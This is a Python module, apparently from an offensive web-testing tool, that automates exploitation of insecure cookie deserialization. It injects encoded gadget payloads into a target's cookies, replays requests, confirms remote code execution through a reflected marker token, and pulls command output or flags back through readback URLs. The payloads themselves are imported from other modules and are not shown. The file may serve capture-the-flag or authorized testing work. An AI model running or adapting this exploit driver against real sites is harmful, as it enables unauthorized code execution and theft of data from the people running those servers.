from __future__ import annotations

import secrets

from ravage.probes.cookie.cookie_deserialization_discovery import _replay_urls
from ravage.probes.cookie.cookie_deserialization_format import CookieFormat
from ravage.probes.cookie.cookie_deserialization_payloads import _READBACK_FETCH, _gadgets
from ravage.probes.cookie.cookie_deserialization_shared import _cookie_header, _request_summary
from ravage.web_core.http_probe import ProbeSession
from ravage.web_core.proof_recognizer import recognize_proofs


def _exploit_cookie(
    session: ProbeSession,
    *,
    name: str,
    fmt: CookieFormat,
    cookie_jar: dict[str, str],
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
    budget: int,
) -> int:
    token = "RAVAGE_DESER_" + secrets.token_hex(6)
    replay_urls = _replay_urls(session)
    for gadget in _gadgets(fmt.kind, token):
        if budget <= 0:
            break
        cookie_value = fmt.encode(gadget)
        header = {"Cookie": _cookie_header(cookie_jar, name, cookie_value)}
        for url in replay_urls:
            if budget <= 0:
                break
            budget -= 1
            response = session.get(url, headers=header)
            requests.append(_request_summary(response, url=url, cookie=name, gadget=fmt.kind))
            if _record_proof(response.body, findings, cookie=name, fmt=fmt, channel="reflected"):
                return budget
            if token in response.body and not _marker_already(findings):
                findings.append(
                    {
                        "type": "cookie_deserialization_marker",
                        "cookie": name,
                        "format": fmt.kind,
                        "channel": "reflected",
                        "detail": "gadget marker reflected: deserialization RCE confirmed without a flag yet",
                    }
                )
        budget = _readback(
            session,
            token=token,
            findings=findings,
            requests=requests,
            budget=budget,
            cookie=name,
            fmt=fmt,
        )
        if _has_cookie_deserialization_proof(findings):
            break
    return budget


def _readback(
    session: ProbeSession,
    *,
    token: str,
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
    budget: int,
    cookie: str,
    fmt: CookieFormat,
) -> int:
    for template in _READBACK_FETCH:
        if budget <= 0:
            break
        budget -= 1
        url = template.format(name=token)
        response = session.get(url)
        requests.append(_request_summary(response, url=url, cookie=cookie, gadget="readback"))
        if _record_proof(response.body, findings, cookie=cookie, fmt=fmt, channel="readback"):
            break
    return budget


def _record_proof(
    body: str,
    findings: list[dict[str, object]],
    *,
    cookie: str,
    fmt: CookieFormat,
    channel: str,
) -> bool:
    proofs = recognize_proofs(body)
    if not proofs:
        return False
    findings.append(
        {
            "type": "cookie_deserialization_extracted_proof",
            "cookie": cookie,
            "format": fmt.kind,
            "channel": channel,
            "proofs": proofs,
            "proof": proofs[0],
        }
    )
    return True


def _marker_already(findings: list[dict[str, object]]) -> bool:
    for finding in findings:
        if finding.get("type") == "cookie_deserialization_marker":
            return True
    return False


def _has_cookie_deserialization_proof(findings: list[dict[str, object]]) -> bool:
    for finding in findings:
        if finding.get("type") == "cookie_deserialization_extracted_proof":
            return True
    return False
